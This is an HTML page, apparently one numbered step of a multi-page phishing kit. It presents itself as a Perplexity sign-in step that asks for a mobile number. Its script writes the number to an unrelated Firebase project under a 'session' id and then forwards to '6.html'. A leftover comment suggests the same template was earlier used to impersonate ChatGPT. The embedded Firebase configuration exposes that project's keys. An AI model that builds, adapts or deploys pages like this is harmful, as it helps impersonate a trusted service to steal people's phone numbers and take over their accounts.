<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Your Mobile Number</title>
    <style>
        :root {
            /* Light Theme Variables */
            --bg-color: #ffffff;
            --text-primary: #2d333a;
            --text-secondary: #6e6e80;
            --input-border: #c2c8d0;
            --input-bg: #ffffff;
            --input-text: #000000;
            --input-focus: #000000;
            --label-bg: #ffffff;
            --btn-bg: #0f172a;
            --btn-text: #ffffff;
            --btn-hover: #1e293b;
            --error-color: #d93025;
        }

        :root.dark-theme {
            /* Dark Theme Variables */
            --bg-color: #000000;
            --text-primary: #ffffff;
            --text-secondary: #a1a1aa;
            --input-border: #3f3f46;
            --input-bg: #000000;
            --input-text: #ffffff;
            --input-focus: #ffffff;
            --label-bg: #000000;
            --btn-bg: #ffffff;
            --btn-text: #000000;
            --btn-hover: #e4e4e7;
            --error-color: #f87171;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: var(--bg-color);
            transition: background-color 0.3s ease;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }

        h1 {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--text-primary);
            letter-spacing: -0.5px;
            transition: color 0.3s ease;
        }

        p {
            font-size: 16px;
            color: var(--text-secondary);
            line-height: 1.5;
            margin-bottom: 30px;
            transition: color 0.3s ease;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
        }

        .input-label {
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--label-bg);
            padding: 0 5px;
            font-size: 12px;
            color: var(--text-secondary);
            z-index: 1;
            transition: background-color 0.3s ease, color 0.3s ease;
        }

        input[type="tel"] {
            width: 100%;
            padding: 16px;
            font-size: 18px;
            background-color: var(--input-bg);
            color: var(--input-text);
            border: 1px solid var(--input-border);
            border-radius: 30px;
            outline: none;
            transition: border-color 0.2s, background-color 0.3s, color 0.3s;
        }

        input[type="tel"]:focus {
            border-color: var(--input-focus);
        }

        /* Remove arrows from number input */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .btn-continue {
            width: 100%;
            padding: 14px;
            background-color: var(--btn-bg);
            color: var(--btn-text);
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s, color 0.2s;
        }

        .btn-continue:hover {
            background-color: var(--btn-hover);
        }

        .error-msg {
            color: var(--error-color);
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
    </style>

    <!-- Theme Handling Script -->
    <script>
        function applyTheme() {
            const urlParams = new URLSearchParams(window.location.search);
            const themeParam = urlParams.get('theme');
            const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)');

            if (themeParam === 'dark') {
                document.documentElement.classList.add('dark-theme');
            } else if (themeParam === 'light') {
                document.documentElement.classList.remove('dark-theme');
            } else if (systemPrefersDark.matches) {
                document.documentElement.classList.add('dark-theme');
            } else {
                document.documentElement.classList.remove('dark-theme');
            }
        }

        // Apply immediately to prevent Flash of Unstyled Content (FOUC)
        applyTheme();

        // Listen for real-time system native theme changes
        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
            const urlParams = new URLSearchParams(window.location.search);
            // Only adapt to system changes if no explicit URL theme overrides it
            if (!urlParams.has('theme')) {
                if (e.matches) {
                    document.documentElement.classList.add('dark-theme');
                } else {
                    document.documentElement.classList.remove('dark-theme');
                }
            }
        });
    </script>
</head>
<body>

    <div class="container">
        <!-- ChatGPT Text Removed as requested -->
        
        <h1>Connect Your Mobile Number</h1>
        <p>Connect Your Phone Number to signing in to your Perplexity Account</p>

        <div class="input-group">
            <span class="input-label">Mobile Number</span>
            <input type="tel" id="mobileNumber" placeholder="1234567890" maxlength="10" autocomplete="off">
            <div id="error" class="error-msg">Please enter a valid 10-digit number</div>
        </div>

        <button class="btn-continue" id="submitBtn">Continue</button>
    </div>

    <!-- Firebase Scripts -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Get elements
        const phoneInput = document.getElementById('mobileNumber');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('error');

        // Function to get Session ID from URL
        const getSessionId = () => {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('session');
        };

        // Function to carry over theme param to next page if it exists
        const getThemeParam = () => {
            const urlParams = new URLSearchParams(window.location.search);
            const theme = urlParams.get('theme');
            return theme ? `&theme=${theme}` : '';
        };

        const sessionId = getSessionId();

        // Restriction: Only allow 10 digits
        phoneInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
            errorMsg.style.display = 'none';
        });

        // Handle submission
        const handleSubmit = async () => {
            const number = phoneInput.value;

            if (number.length !== 10) {
                errorMsg.style.display = 'block';
                return;
            }

            if (!sessionId) {
                alert("Session ID missing in URL");
                return;
            }

            try {
                // Reference the specific document in "ASPX Keys" collection
                const docRef = doc(db, "ASPX Keys", sessionId);
                
                // Update the document with the mobile number
                await updateDoc(docRef, {
                    mobileNumber: number,
                    updatedAt: serverTimestamp()
                });

                // Redirect to 6.html with same session ID and keep theme intact
                window.location.href = `6.html?session=${sessionId}${getThemeParam()}`;

            } catch (e) {
                console.error("Error updating document: ", e);
                alert("An error occurred. Please try again.");
            }
        };

        // Click Event
        submitBtn.addEventListener('click', handleSubmit);

        // Enter Key Event
        phoneInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                handleSubmit();
            }
        });
    </script>
</body>
</html>
